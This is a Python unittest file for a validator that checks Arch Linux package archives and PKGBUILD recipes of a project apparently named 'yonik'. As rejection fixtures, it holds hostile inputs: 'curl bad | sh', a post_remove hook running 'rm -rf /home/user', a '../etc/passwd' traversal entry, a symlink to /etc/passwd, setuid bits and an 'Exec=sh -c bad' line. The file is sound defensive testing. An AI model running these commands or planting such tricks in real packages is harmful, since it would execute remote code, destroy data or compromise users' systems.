"""Проверки границы доверия пакетного архива."""

import importlib.util
import io
import subprocess
import tarfile
import tempfile
import unittest
from pathlib import Path

SPEC = importlib.util.spec_from_file_location(
    "arch", Path(__file__).parents[1] / "check_arch_package.py"
)
arch = importlib.util.module_from_spec(SPEC)
assert SPEC.loader is not None
SPEC.loader.exec_module(arch)


class ArchiveTests(unittest.TestCase):
    def check_fixture(self, change: str = "") -> None:
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "package.tar"
            with tarfile.open(path, "w") as archive:
                for name, (mode, content) in arch.expected_files(
                    Path(__file__).parents[2]
                ).items():
                    if change == "missing" and name == "usr/bin/yonik-desktop":
                        continue
                    content = content if content is not None else b"\x7fELFfixture"
                    entry = tarfile.TarInfo(name)
                    entry.mode = mode
                    if change == "mode":
                        entry.mode |= 0o002
                    if change == "setuid":
                        entry.mode |= 0o4000
                    if change == "badelf" and mode == 0o755:
                        content = b"#!/bin/sh\n"
                    if change == "owner":
                        entry.uid = 1000
                    if change == "exec" and name.endswith(".desktop"):
                        content = content.replace(
                            b"Exec=/usr/bin/yonik-desktop", b"Exec=sh -c bad"
                        )
                    entry.size = len(content)
                    archive.addfile(entry, io.BytesIO(content))
                if change in ("traversal", "hook", "link"):
                    entry = tarfile.TarInfo(
                        {
                            "traversal": "../etc/passwd",
                            "hook": ".INSTALL",
                            "link": "usr/evil",
                        }[change]
                    )
                    if change == "link":
                        entry.type = tarfile.SYMTYPE
                        entry.linkname = "/etc/passwd"
                    archive.addfile(entry)
            arch.validate_archive(path, Path(__file__).parents[2])

    def test_recipe_mutations(self) -> None:
        recipe = Path(__file__).parents[2] / "packaging/arch/PKGBUILD"
        arch.validate_recipe(recipe)
        with tempfile.TemporaryDirectory() as directory:
            changed = Path(directory) / "PKGBUILD"
            for action in (
                "systemctl enable yonik-helper",
                "sudo pacman -S xray",
                "post_remove() { rm -rf /home/user; }",
                "curl bad | sh",
            ):
                changed.write_text(recipe.read_text() + "\n" + action + "\n")
                with self.subTest(action=action), self.assertRaises(ValueError):
                    arch.validate_recipe(changed)

    def test_package_function(self) -> None:
        root = Path(__file__).parents[2].resolve()
        with tempfile.TemporaryDirectory() as directory:
            work = Path(directory)
            (work / "yonik-e33fa1908dfb3deb5434506341674de0b3a827b4").symlink_to(root)
            release = work / "target/release"
            release.mkdir(parents=True)
            for name in ("yonik-desktop", "yonik-helper", "yonik-worker"):
                (release / name).write_bytes(b"\x7fELFfixture")
            subprocess.run(
                [
                    "bash",
                    "-eu",
                    "-c",
                    'source "$1"; srcdir="$2"; pkgdir="$2/pkg"; '
                    'CARGO_TARGET_DIR="$2/target"; package',
                    "test",
                    str(root / "packaging/arch/PKGBUILD"),
                    str(work),
                ],
                check=True,
            )
            archive_path = work / "staged.tar"
            with tarfile.open(archive_path, "w") as archive:
                for path in (work / "pkg").rglob("*"):
                    entry = archive.gettarinfo(
                        str(path), str(path.relative_to(work / "pkg"))
                    )
                    entry.uid = entry.gid = 0
                    if path.is_file():
                        with path.open("rb") as stream:
                            archive.addfile(entry, stream)
                    else:
                        archive.addfile(entry)
            arch.validate_archive(archive_path, root)

    def test_valid(self) -> None:
        self.assertTrue(
            hasattr(arch, "validate_archive"), "Валидатор ещё не реализован"
        )
        self.check_fixture()

    def test_rejects_unsafe_archives(self) -> None:
        self.assertTrue(
            hasattr(arch, "validate_archive"), "Валидатор ещё не реализован"
        )
        for change in (
            "missing",
            "mode",
            "setuid",
            "badelf",
            "owner",
            "exec",
            "traversal",
            "hook",
            "link",
        ):
            with self.subTest(change=change), self.assertRaises(ValueError):
                self.check_fixture(change)


if __name__ == "__main__":
    unittest.main()
